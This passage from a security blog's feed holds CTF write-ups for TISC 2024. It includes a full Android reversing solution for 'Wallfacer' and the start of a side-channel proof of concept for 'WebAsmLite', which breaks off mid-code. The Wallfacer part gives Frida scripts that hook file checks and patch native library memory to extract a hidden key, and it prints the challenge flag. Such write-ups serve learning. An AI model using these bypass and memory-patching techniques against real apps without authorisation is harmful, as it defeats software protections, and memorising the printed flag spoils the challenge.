+<p>The ultimate question now is this: would I recommend this certificate to people? Definitely, but on a personal note, it would be preferable if you have SOME knowledge in Active Directory as a start. You can easily read up on Active Directory via this website first to kickstart your journey prior to taking up the certification: <a href="https://adsecurity.org/">https://adsecurity.org/</a></p>
+
+<p>But if you feel that you want to just jump in, by all means go for it! This is just my point of view if your intent is to pass the certification for the first time.</p>]]></content><author><name>baesenseii</name></author><category term="certs" /><category term="crtp" /><summary type="html"><![CDATA[Note that it’s an overdue write-up regarding this certification (achieved it in April 2024), but I think it’s good to pen down my honest thoughts about this. Reference: https://www.alteredsecurity.com/post/certified-red-team-professional-crtp Preface If you take a look at my certifications, it has been like what, 7-8 years since I did any of the crazy-ass certifications by Offensive Security and CREST (because it was no longer required anyway), which is a pretty long duration of time. Over the years I do reach out to peers and junior cybersecurity professionals to know what changes are there in these certifications (especially with Offsec and CREST certifications getting a syllabus refresh from the last time I took it), and one thing commonly popped up across all these certifications: Windows Active Directory Environments. I have my fair share of performing network penetration testing activities etc (and i’m still not a pro at it), but I’ll be honest though: I am pretty weak when it comes to navigating within AD environments. And with a budget constraint (unlike the old days when my former company sponsors me for certification attempts, but for academia it’s a little bit, difficult), I had to be a bit thrifty in terms of what red team / penetration testing certificates to take. This is when i came across CRTP (which was initially under PentesterAcademy, but now under Altered Security but the certification is still under the same guy Nikhil Mittal, mad respect for his work too especially his Nishang Powershell scripts which were pretty useful in Windows AD environments). Lab Experience After signing up for the program you will be provided with credentials and the link to the training portal. The environment does give me the same feel as the days when I took up Offsec certs whereby VPN access was provided to connect my Kali VM to the lab environment. However what was different is that they also had a Guacamole RDP instance to the compromised Windows machine (which was good for me, but there were moments that it was slow, which is fine).]]></summary></entry><entry><title type="html">CSIT TISC 2024 CTF Challenge 8 - Wallfacer</title><link href="http://localhost:4000/posts/tisc24_challenge_8_fc50222e/" rel="alternate" type="text/html" title="CSIT TISC 2024 CTF Challenge 8 - Wallfacer" /><published>2024-10-21T00:00:00-05:00</published><updated>2024-10-21T00:00:00-05:00</updated><id>http://localhost:4000/posts/tisc24_challenge_8_fc50222e</id><content type="html" xml:base="http://localhost:4000/posts/tisc24_challenge_8_fc50222e/"><![CDATA[<p>Alright here we go, the most painful and yet rewarding challenge throughout the TISC CTF 2024 that made me so humbled and curious to learn more about Android mobile exploitation.</p>
+
+<p><img src="/assets/images/tisc-2024/Pasted image 20240930055803.png" alt="" /></p>
+
+<h1 id="just-playing-around">Just playing around…</h1>
+
+<p>After installing the mobile application using Genymotion, this is what I was presented with upon loading:</p>
+
+<p><img src="/assets/images/tisc-2024/Pasted image 20241126105656.png" alt="" /></p>
+
+<p>Initial analysis of the mobile application did not seem to have any events triggered based on submitted inputs (based on what was shown in the MainActivity.java app):</p>
+
+<p><img src="/assets/images/tisc-2024/Pasted image 20241126110138.png" alt="" /></p>
+
+<p>Next thing to do is to look at the AndroidManifest.xml file to see if there are any exported Android activities, and turns out there are two:</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
+        <span class="nt">&lt;activity</span>
+            <span class="na">android:name=</span><span class="s">"com.wall.facer.query"</span>
+            <span class="na">android:exported=</span><span class="s">"true"</span><span class="nt">/&gt;</span>
+        <span class="nt">&lt;activity</span>
+            <span class="na">android:name=</span><span class="s">"com.wall.facer.MainActivity"</span>
+            <span class="na">android:exported=</span><span class="s">"true"</span><span class="nt">&gt;</span>
+            <span class="nt">&lt;intent-filter&gt;</span>
+                <span class="nt">&lt;action</span> <span class="na">android:name=</span><span class="s">"android.intent.action.MAIN"</span><span class="nt">/&gt;</span>
+                <span class="nt">&lt;category</span> <span class="na">android:name=</span><span class="s">"android.intent.category.LAUNCHER"</span><span class="nt">/&gt;</span>
+            <span class="nt">&lt;/intent-filter&gt;</span>
+        <span class="nt">&lt;/activity&gt;</span>
+...
+
+</code></pre></div></div>
+
+<p>Launching the other exported activity can be done using ADB:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>am start -n com.wall.facer/com.wall.facer.query
+</code></pre></div></div>
+
+<p><img src="/assets/images/tisc-2024/Pasted image 20241202012348.png" alt="" /></p>
+
+<p>But apart from that, there’s nothing much to do from there, welps. Guess I have to look through other resources.</p>
+<h1 id="part-i---the-hidden-dex">Part I - The Hidden Dex</h1>
+<p>After digging through thousands of lines of code, when going through the resources, I came across this weird string value called “filename” in the strings.xml file:</p>
+
+<p><img src="/assets/images/tisc-2024/Pasted image 20241201202448.png" alt="" /></p>
+
+<p>Just by doing a quick Base64 decode of that string reveals that there is a sqlite.db file:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>red@ops:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"c3FsaXRlLmRi"</span> | <span class="nb">base64</span> <span class="nt">-d</span>
+sqlite.db
+</code></pre></div></div>
+
+<p>After looking through the Android app assets folder, i did find the sqlite.db file however there seemed to be some form of error when loading it into the sqlite3 database viewer:</p>
+
+<p><img src="/assets/images/tisc-2024/Pasted image 20241202000024.png" alt="" /></p>
+
+<p>HMMMM….STRANGE….</p>
+
+<p>Normally any values that are being stored in the strings.xml gets referenced in Android applications via an R.id value. In this case, grepping the ‘filename’ keyword resulted in discovering its R.id value of 0x7f0f0038:</p>
+
+<p><img src="/assets/images/tisc-2024/Pasted image 20241201230154.png" alt="" /></p>
+
+<p>What’s even weirder about this is that attempting to search for that value based on the Java source code obtained via Jadx, nothing turned up:</p>
+
+<p><img src="/assets/images/tisc-2024/Pasted image 20241201230504.png" alt="" /></p>
+
+<p>However, if we go through the Android smali bytecode, we discover that there is a file that contains that R.id value reference (K0.smali):</p>
+
+<p><img src="/assets/images/tisc-2024/Pasted image 20241201231036.png" alt="" /></p>
+
+<p><img src="/assets/images/tisc-2024/Pasted image 20241201231419.png" alt="" /></p>
+
+<p>If we look at line 106, there is a method invocation of the ClassLoader function (more info here: https://developer.android.com/reference/dalvik/system/InMemoryDexClassLoader), which loads Dex code that might have additional functionalities that are not included inside the app. And guess where the data for the ClassLoader file is from? Yep you guessed it, our suspicious sqlite.db file.</p>
+
+<p>Another interesting item that i noticed is in line 102 of K0.smali, which is the invocation of the LA8.K() function:</p>
+
+<p><img src="/assets/images/tisc-2024/Pasted image 20241202002027.png" alt="" /></p>
+
+<p>After painstakingly figuring out what this function is about, I finally managed to discover here:</p>
+
+<p><img src="/assets/images/tisc-2024/Pasted image 20241202002357.png" alt="" /></p>
+
+<p>After following through the code, we do know that apparently this function is the one responsible for passing data to the earlier mentioned ClassLoader function. Tracing the code further results in line 259 of the code above to contain the apparent Dex code from the sqlite.db file.</p>
+
+<p>With the mighty power of Frida, I quickly whipped up a Frida script that can extract the data from that function (as the data taken in by the function is in bytes, I used a Base64 encoder to encode the byte data and output it to the command line):</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">Java</span><span class="o">.</span><span class="na">perform</span><span class="o">(</span><span class="n">function</span><span class="o">()</span> <span class="o">{</span>
+
+<span class="c1">// get the bytebuffer data - which is the final output of the K function.</span>
+<span class="kt">var</span> <span class="n">className</span> <span class="o">=</span> <span class="s">"java.nio.ByteBuffer"</span><span class="o">;</span>
+<span class="kt">var</span> <span class="n">classInstance</span> <span class="o">=</span> <span class="nc">Java</span><span class="o">.</span><span class="na">use</span><span class="o">(</span><span class="n">className</span><span class="o">);</span>
+
+<span class="n">classInstance</span><span class="o">.</span><span class="na">wrap</span><span class="o">.</span><span class="na">overload</span><span class="o">(</span><span class="s">"[B"</span><span class="o">).</span><span class="na">implementation</span> <span class="o">=</span> <span class="n">function</span><span class="o">(</span><span class="n">arg1</span><span class="o">)</span>
+<span class="o">{</span>
+    <span class="c1">// create a Base64 object first</span>
+    <span class="kt">var</span> <span class="n">b64_obj</span> <span class="o">=</span> <span class="nc">Java</span><span class="o">.</span><span class="na">use</span><span class="o">(</span><span class="s">"android.util.Base64"</span><span class="o">).</span><span class="n">$new</span><span class="o">();</span>
+    <span class="n">console</span><span class="o">.</span><span class="na">log</span><span class="o">(</span><span class="n">b64_obj</span><span class="o">.</span><span class="na">encodeToString</span><span class="o">(</span><span class="n">arg1</span><span class="o">,</span><span class="mi">2</span><span class="o">));</span>
+
+    
+    <span class="k">return</span> <span class="k">this</span><span class="o">.</span><span class="na">wrap</span><span class="o">(</span><span class="n">arg1</span><span class="o">);</span>
+<span class="o">};</span>
+
+<span class="o">});</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/tisc-2024/Pasted image 20241202005124.png" alt="" /></p>
+
+<p>Decoded the printed string from Frida and pushed it into a file, and voila whaddya know, we got a dex file:</p>
+
+<p><img src="/assets/images/tisc-2024/Pasted image 20241202005225.png" alt="" /></p>
+
+<p>First thing to do is to run jadx on the .dex file, however errors keep popping up. After doing a quick Google search, the cause for the error is the checksum verification that jadx performs by default. So in this case, the command was slightly modified to turn off checksum verification:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/jadx/bin/jadx fixed.dex -Pdex-input.verify-checksum=no
+</code></pre></div></div>
+
+<p>And whaddya know…</p>
+
+<p><img src="/assets/images/tisc-2024/Pasted image 20241202005434.png" alt="" /></p>
+<h1 id="part-ii---getting-to-know-my-walls">Part II - Getting to know my walls</h1>
+
+<p>Based on the Java translated source code obtained from the Dex file, we found two items of interest here n DynamicClass.java:</p>
+
+<p><img src="/assets/images/tisc-2024/Pasted image 20241202005712.png" alt="" /></p>
+
+<ul>
+  <li>A NativeLibrary file is dynamically generated, but before that there is a pollForTombMessage() function that triggers the generateNativeLibrary() function once the polling is done.</li>
+  <li>After the native library is loaded, there is a function called pollForAdvanceMessage() that will trigger the nativeMethod() function once the polling is done –&gt; chances are that this is from the NativeLibrary file.</li>
+  <li>ADB Logcat messages are tagged with a TAG value, which in this case turned out to be “TISC”.</li>
+</ul>
+
+<p>Within the same Java file, this is the implementation of both the pollForTombMessage() and pollForAdvanceMessage() functions:</p>
+
+<p><strong>pollForTombMessage()</strong></p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="kd">private</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">pollForTombMessage</span><span class="o">()</span> <span class="kd">throws</span> <span class="nc">ClassNotFoundException</span><span class="o">,</span> <span class="nc">NoSuchMethodException</span><span class="o">,</span> <span class="nc">InvocationTargetException</span><span class="o">,</span> <span class="nc">IllegalAccessException</span> <span class="o">{</span>
+        <span class="nc">Class</span><span class="o">&lt;?&gt;</span> <span class="n">cls</span><span class="o">;</span>
+        <span class="k">do</span> <span class="o">{</span>
+            <span class="nc">SystemClock</span><span class="o">.</span><span class="na">sleep</span><span class="o">(</span><span class="mi">1000L</span><span class="o">);</span>
+            <span class="n">cls</span> <span class="o">=</span> <span class="nc">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"com.wall.facer.Storage"</span><span class="o">);</span>
+        <span class="o">}</span> <span class="k">while</span> <span class="o">(!</span><span class="nc">DynamicClass</span><span class="err">$</span><span class="n">$ExternalSyntheticBackport1</span><span class="o">.</span><span class="na">m</span><span class="o">((</span><span class="nc">String</span><span class="o">)</span> <span class="n">cls</span><span class="o">.</span><span class="na">getMethod</span><span class="o">(</span><span class="s">"getMessage"</span><span class="o">,</span> <span class="k">new</span> <span class="nc">Class</span><span class="o">[</span><span class="mi">0</span><span class="o">]).</span><span class="na">invoke</span><span class="o">(</span><span class="n">cls</span><span class="o">.</span><span class="na">getMethod</span><span class="o">(</span><span class="s">"getInstance"</span><span class="o">,</span> <span class="k">new</span> <span class="nc">Class</span><span class="o">[</span><span class="mi">0</span><span class="o">]).</span><span class="na">invoke</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span> <span class="k">new</span> <span class="nc">Object</span><span class="o">[</span><span class="mi">0</span><span class="o">]),</span> <span class="k">new</span> <span class="nc">Object</span><span class="o">[</span><span class="mi">0</span><span class="o">]),</span> <span class="s">"I am a tomb"</span><span class="o">));</span>
+    <span class="o">}</span>
+</code></pre></div></div>
+
+<p><strong>pollForAdvanceMessage()</strong></p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">private</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">pollForAdvanceMessage</span><span class="o">()</span> <span class="kd">throws</span> <span class="nc">ClassNotFoundException</span><span class="o">,</span> <span class="nc">NoSuchMethodException</span><span class="o">,</span> <span class="nc">InvocationTargetException</span><span class="o">,</span> <span class="nc">IllegalAccessException</span> <span class="o">{</span>
+        <span class="nc">Class</span><span class="o">&lt;?&gt;</span> <span class="n">cls</span><span class="o">;</span>
+        <span class="k">do</span> <span class="o">{</span>
+            <span class="nc">SystemClock</span><span class="o">.</span><span class="na">sleep</span><span class="o">(</span><span class="mi">1000L</span><span class="o">);</span>
+            <span class="n">cls</span> <span class="o">=</span> <span class="nc">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"com.wall.facer.Storage"</span><span class="o">);</span>
+        <span class="o">}</span> <span class="k">while</span> <span class="o">(!</span><span class="nc">DynamicClass</span><span class="err">$</span><span class="n">$ExternalSyntheticBackport1</span><span class="o">.</span><span class="na">m</span><span class="o">((</span><span class="nc">String</span><span class="o">)</span> <span class="n">cls</span><span class="o">.</span><span class="na">getMethod</span><span class="o">(</span><span class="s">"getMessage"</span><span class="o">,</span> <span class="k">new</span> <span class="nc">Class</span><span class="o">[</span><span class="mi">0</span><span class="o">]).</span><span class="na">invoke</span><span class="o">(</span><span class="n">cls</span><span class="o">.</span><span class="na">getMethod</span><span class="o">(</span><span class="s">"getInstance"</span><span class="o">,</span> <span class="k">new</span> <span class="nc">Class</span><span class="o">[</span><span class="mi">0</span><span class="o">]).</span><span class="na">invoke</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span> <span class="k">new</span> <span class="nc">Object</span><span class="o">[</span><span class="mi">0</span><span class="o">]),</span> <span class="k">new</span> <span class="nc">Object</span><span class="o">[</span><span class="mi">0</span><span class="o">]),</span> <span class="s">"Only Advance"</span><span class="o">));</span>
+    <span class="o">}</span>
+
+</code></pre></div></div>
+
+<p>To obtain the NativeLibrary file, you will just need to do the following:</p>
+<ul>
+  <li>Load up the following Frida script to stop the NativeLibrary file from getting deleted after it is generated (logic of script below is just to return the exists() function to be 0 instead of a 1):</li>
+</ul>
+
+<p><strong>Command to run</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>frida -U -f com.wall.facer -l nodelete.js
+</code></pre></div></div>
+
+<p><strong>Frida Script called (nodelete.js for this example)</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Java.perform(function() {
+
+// get the bytebuffer data - which is the final output of the K function.
+var className = "java.io.File";
+var classInstance = Java.use(className);
+
+classInstance.exists.implementation = function()
+{
+    console.log("delete stopped");
+        return 0;
+}
+
+});
+
+</code></pre></div></div>
+
+<ul>
+  <li>Type the words “I am a tomb” and press submit.</li>
+</ul>
+
+<p>You can use ADB to navigate to the application data folder directory (/data/data/com.wall.facer) and view the ‘files’ folder here to see the libnative.so file:</p>
+
+<p><img src="/assets/images/tisc-2024/Pasted image 20241202021440.png" alt="" /></p>
+
+<p>Once done, launch Terminal and type in the following command to download it into your system:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>adb pull /data/data/com.facer.wall/files/libnative.so .
+</code></pre></div></div>
+
+<p>Now typing the following text ‘Only Advance’ triggers another set of log messages that are basically from the NativeMethod() function, which is eventually from the libnative.so library:</p>
+
+<p><img src="/assets/images/tisc-2024/Pasted image 20241202021657.png" alt="" /></p>
+
+<p>Guess now we know that there are three walls that we need to overcome.</p>
+<h1 id="part-iii---overcoming-the-walls">Part III - Overcoming the walls</h1>
+
+<p>Now I would love to do a deep-dive analysis on the shared library, but truth be told, I think i might have delayed this writeup for too long, so much so that there are other people out there that did an AMAZING job in the writeup.</p>
+
+<p>Before proceeding to this part, kindly read up this section of his writeup regarding the deep-dive analysis of the NativeMethod() function here: <a href="https://blog.0wl.sg/Posts/2024/October/20241021000000---BLG---TISC-2024-Challenge-8-(Wallfacer)-Writeup#analyzing-nativemethod-from-libnativeso">Challenge 8 Wallfacer Writeup - analyzing nativemethod from libnativeso</a></p>
+
+<p>Once you are done with reading above, in that case I will only be focusing on the final solution, which is a memory patching technique using Frida. The following steps were taken:</p>
+
+<h2 id="final-frida-script-code">Final Frida Script Code</h2>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">baseAddr</span> <span class="o">=</span> <span class="nx">Module</span><span class="p">.</span><span class="nf">findBaseAddress</span><span class="p">(</span><span class="dl">"</span><span class="s2">libnative.so</span><span class="dl">"</span><span class="p">);</span>
+<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Base Address: </span><span class="dl">"</span><span class="o">+</span><span class="nx">baseAddr</span><span class="p">);</span>
+
+<span class="c1">// knocking down wall 1</span>
+<span class="kd">var</span> <span class="nx">pc0</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">NativePointer</span><span class="p">(</span><span class="nx">baseAddr</span><span class="p">.</span><span class="nf">add</span><span class="p">(</span><span class="mh">0x5ab0</span><span class="p">));</span>
+<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">Memory</span><span class="p">.</span><span class="nf">protect</span><span class="p">(</span><span class="nx">pc0</span><span class="p">,</span><span class="mi">15</span><span class="p">,</span><span class="dl">'</span><span class="s1">rw-</span><span class="dl">'</span><span class="p">));</span>
+<span class="nx">Memory</span><span class="p">.</span><span class="nf">writeByteArray</span><span class="p">(</span><span class="nx">pc0</span><span class="p">,[</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x62</span> <span class="p">]);</span> <span class="c1">//write to replacement string /data/local/cab (just created a sample file in the phone)</span>
+<span class="c1">// this is to also preserve the same number of bytes</span>
+<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[WALL1] Replacing '/sys/wall/facer' to '/data/local/cab'..</span><span class="dl">"</span><span class="p">);</span>
+
+<span class="c1">// for patching instruction to knock down wall 2</span>
+<span class="kd">var</span> <span class="nx">pc1</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">NativePointer</span><span class="p">(</span><span class="nx">baseAddr</span><span class="p">.</span><span class="nf">add</span><span class="p">(</span><span class="mh">0x1f78</span><span class="p">));</span>
+<span class="nx">Memory</span><span class="p">.</span><span class="nf">protect</span><span class="p">(</span><span class="nx">pc1</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="dl">'</span><span class="s1">rwx</span><span class="dl">'</span><span class="p">);</span>
+<span class="nx">Memory</span><span class="p">.</span><span class="nf">writeByteArray</span><span class="p">(</span><span class="nx">pc1</span><span class="p">,[</span><span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0x5</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">]);</span>
+<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[WALL2] Patching instruction at offset 0x1f78...</span><span class="dl">"</span><span class="p">);</span>
+
+<span class="c1">//Knocking down of Wall 3</span>
+<span class="c1">//2a looks good =&gt; removed the "i'm afraid i'm going to have to stop you from getting the correct key and IV"</span>
+<span class="kd">var</span> <span class="nx">pc2a</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">NativePointer</span><span class="p">(</span><span class="nx">baseAddr</span><span class="p">.</span><span class="nf">add</span><span class="p">(</span><span class="mh">0x231a</span><span class="p">));</span>
+<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[WALL3A] Patching instruction at offset 0x231a...</span><span class="dl">"</span><span class="p">);</span>
+<span class="nx">Memory</span><span class="p">.</span><span class="nf">protect</span><span class="p">(</span><span class="nx">pc2a</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="dl">'</span><span class="s1">rwx</span><span class="dl">'</span><span class="p">);</span>
+<span class="nx">Memory</span><span class="p">.</span><span class="nf">writeByteArray</span><span class="p">(</span><span class="nx">pc2a</span><span class="p">,[</span><span class="mh">0xc7</span><span class="p">,</span> <span class="mh">0xc7</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0x5</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">]);</span>
+
+<span class="c1">//2b looks good =&gt; this is to patch the other switch case that uses 0xa13 instead of the usual 0x539 for others</span>
+
+<span class="kd">var</span> <span class="nx">pc2b</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">NativePointer</span><span class="p">(</span><span class="nx">baseAddr</span><span class="p">.</span><span class="nf">add</span><span class="p">(</span><span class="mh">0x3746</span><span class="p">));</span>
+<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[WALL3B] Patching instruction at offset 0x3746...</span><span class="dl">"</span><span class="p">);</span>
+<span class="nx">Memory</span><span class="p">.</span><span class="nf">protect</span><span class="p">(</span><span class="nx">pc2b</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="dl">'</span><span class="s1">rwx</span><span class="dl">'</span><span class="p">);</span>
+<span class="nx">Memory</span><span class="p">.</span><span class="nf">writeByteArray</span><span class="p">(</span><span class="nx">pc2b</span><span class="p">,[</span><span class="mh">0xc7</span><span class="p">,</span> <span class="mh">0xc1</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0x5</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">]);</span>
+</code></pre></div></div>
+
+<h2 id="steps-to-take">Steps to Take</h2>
+<ul>
+  <li>Save script into a file</li>
+  <li>Run the following Frida syntax:</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>frida -U -f com.wall.facer -l script.js
+</code></pre></div></div>
+
+<p>Now take note that the following error will be shown:</p>
+
+<p><img src="/assets/images/tisc-2024/Pasted image 20241202022634.png" alt="" /></p>
+
+<p>This is because of the NativeLibrary not being loaded when the app is not presented with the words ‘I am a tomb’.</p>
+
+<ul>
+  <li>
+    <p>Type in the text “I am a tomb” in the application and click ‘submit’ (adb logcat logs will show that the native library is loaded).</p>
+  </li>
+  <li>
+    <p>Open your script.js in a notepad and just click ‘save’. Frida assumes that there are changes made if there’s a file operation, which will refresh the script again (this time it should work as by now the library has already loaded)</p>
+  </li>
+</ul>
+
+<p><img src="/assets/images/tisc-2024/Pasted image 20241202022812.png" alt="" /></p>
+
+<ul>
+  <li>Once done, go to the app and type ‘Only Advance’, Frida will handle the necessary hooks and overwrites, and you should be presented with the correct key and IV</li>
+</ul>
+
+<p><img src="/assets/images/tisc-2024/Pasted image 20241202022907.png" alt="" /></p>
+
+<ul>
+  <li>Launch the exported Android Activity that is expecting a Key-IV pair input and enter the values based on what you see at the Android logcat console:</li>
+</ul>
+
+<p><img src="/assets/images/tisc-2024/Pasted image 20241202023035.png" alt="" /></p>
+
+<p>Final flag: TISC{1<em>4m_y0ur_w4llbr34k3r</em>!i#Leb}</p>
+<h1 id="thoughts">Thoughts</h1>
+<p>In my honest opinion, this was the ONE AND ONLY CHALLENGE THAT I GOT HUMBLED BY. Truth be told, previous CTFs that involved Mobile Application challenges were pretty boring because of the fact that it mainly involves static analysis (e.g decompilation of Android app, look look see see, and done).</p>
+
+<p>I think there were some attempts of mobile app CTF challenges in the past that used Frida, but this challenge is really, REALLY annoying indeed. HUGE respect to the challenge creator as well on building this, WELL PLAYED :)</p>
+
+<p>I think after this, my level of knowledge of Frida kind of grew tenfold and I would LOVE to try out other mobile app challenges just like this! Looking forward to more :))</p>]]></content><author><name>baesenseii</name></author><category term="ctf" /><category term="tisc2024" /><summary type="html"><![CDATA[Alright here we go, the most painful and yet rewarding challenge throughout the TISC CTF 2024 that made me so humbled and curious to learn more about Android mobile exploitation.]]></summary></entry><entry><title type="html">CSIT TISC 2024 CTF Challenge 7a - WebAsmLite</title><link href="http://localhost:4000/posts/tisc24_challenge_7a_fa086321/" rel="alternate" type="text/html" title="CSIT TISC 2024 CTF Challenge 7a - WebAsmLite" /><published>2024-10-20T00:00:00-05:00</published><updated>2024-10-20T00:00:00-05:00</updated><id>http://localhost:4000/posts/tisc24_challenge_7a_fa086321</id><content type="html" xml:base="http://localhost:4000/posts/tisc24_challenge_7a_fa086321/"><![CDATA[<p>YAS! Another web application, which is preferably one of my favourites. But truth be told, when i saw the title, i was expecting myself to get screwed whenever i see the letters ‘Asm’.  Anyway, when loading the webapp we’re presented with a simple NodeJS web application that looks like this:</p>
+
+<p><img src="/assets/images/tisc-2024/Pasted image 20240930055818.png" alt="" /></p>
+
+<p>As part of the challenge, we’re also provided with the Dockerfile and source code, which comprises of 3 files:</p>
+<ul>
+  <li>smolvm.js (nodejs implementation on the core implementation of registers, memory layout and the assembly instructions)</li>
+  <li>server.js (server-side logic of the web application)</li>
+  <li>logic.js (which is the main nodeJS file to launch the application, handles the routes etc)</li>
+</ul>
+
+<p>Since it’s mainly a web implementation of the Assembly Language, it’s vital that we understand how it is being implemented by inspecting the smolvm.js file (which is a mini emulator for a custom assembly instruction set), and this is what we can infer:</p>
+<ul>
+  <li>Memory layout is 64-byte unsigned integer</li>
+  <li>Architecture uses 8 1-byte unsigned integer registers</li>
+</ul>
+
+<p><img src="/assets/images/tisc-2024/Pasted image 20241120114152.png" alt="" /></p>
+
+<ul>
+  <li>Data manipulation / arithmetic instructions that we are familiar with (e.g LOAD, MOV, ADD, SUB etc) are implemented.</li>
+</ul>
+
+<p><img src="/assets/images/tisc-2024/Pasted image 20241120115013.png" alt="" /></p>
+
+<ul>
+  <li>Code conditionals JZ (Jump if Zero) and JNZ (Jump if Not Zero) are also implemented.</li>
+</ul>
+
+<p><img src="/assets/images/tisc-2024/Pasted image 20241120115043.png" alt="" /></p>
+
+<ul>
+  <li>The only two special assembly instructions designed are the following:
+    <ul>
+      <li>READ - reads a file within the SMOLVM environment and loads it into memory (only up to 32 bytes in length), provided if the user running the instruction is authorised to do so (verification is done in the fs.readFile() function)</li>
+      <li>WRITE - writes a file within the SMOLVM environment based on the user parameter passed into the fs.createFile() function.</li>
+    </ul>
+  </li>
+</ul>
+
+<p><img src="/assets/images/tisc-2024/Pasted image 20241120115219.png" alt="" /></p>
+
+<p><img src="/assets/images/tisc-2024/Pasted image 20241120121129.png" alt="" /></p>
+
+<p><img src="/assets/images/tisc-2024/Pasted image 20241120121145.png" alt="" /></p>
+
+<p>Looking through server.js, we can also see that there are two nodeJS API routes:</p>
+<ul>
+  <li>/submitdevjob - running the set of assembly code in the context of user ‘noobsteve’, who is a low-privileged user (privilege level 1)</li>
+</ul>
+
+<p><img src="/assets/images/tisc-2024/Pasted image 20241120124036.png" alt="" /></p>
+
+<p><img src="/assets/images/tisc-2024/Pasted image 20241120124052.png" alt="" /></p>
+
+<ul>
+  <li>/requestadmin - running the set of assembly code in the context of two users: User ‘noobsteve’ (privilege level 1) and User ‘goodestboy’ (privilege level 42).
+    <ul>
+      <li>Note: This is the only function that has the flag being created.</li>
+    </ul>
+  </li>
+</ul>
+
+<p><img src="/assets/images/tisc-2024/Pasted image 20241120125416.png" alt="" /></p>
+
+<p>Based on the source code for the /requestadmin function, we can also deduce the following sequence of steps:</p>
+<ul>
+  <li>A filesystem is created using SMOLFS() and the flag.txt file is created inside the filesystem (note that only the adminuser ‘goodestboy’ can access that file).</li>
+  <li>The ‘adminVM’ and ‘userVM’ environments are created (and executed sequentially) to run the same submitted assembly instructions, however both environments are sharing the <strong>same filesystem</strong> that contains the flag.</li>
+  <li>In addition, after running the instructions, the app will only output the results of the memory and registers in the context of the publicuser ‘noobsteve’ (results of running the instructions in adminVM is <strong>redacted</strong>).</li>
+</ul>
+
+<p>Regardless of which API route to use, there is absolutely no way to run assembly instructions in the context of the adminuser. So what needs to be done here? Well there was something that I found quite interesting about the READ instruction:</p>
+
+<p><img src="/assets/images/tisc-2024/Pasted image 20241120131151.png" alt="" /></p>
+
+<p>As we can see that if the READ instruction of a file fails, register 0’s value will be set to -1 (or in this case 255 because the registers are unsigned integers). What if we could use this to our advantage?</p>
+
+<p>So the following PoC was created to verify if we are able to determine if the first letter of the flag (which is ‘T’) using this behaviour:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># First half of the assembly code is meant for the admin user
+
+READ:flag.txt;      # loads the flag.txt file onto memory
+IMM:0:84;           # setting register 0 to value 84 (or ascii 'T') =&gt; register 0 will be used as the comparator
+IMM:2:32;           # setting register 2 to value 32 (memory slot 32, which points to the first char of the flag in flag.txt)
+LOAD:3:2;           # load contents of memory slot 32 to register 3
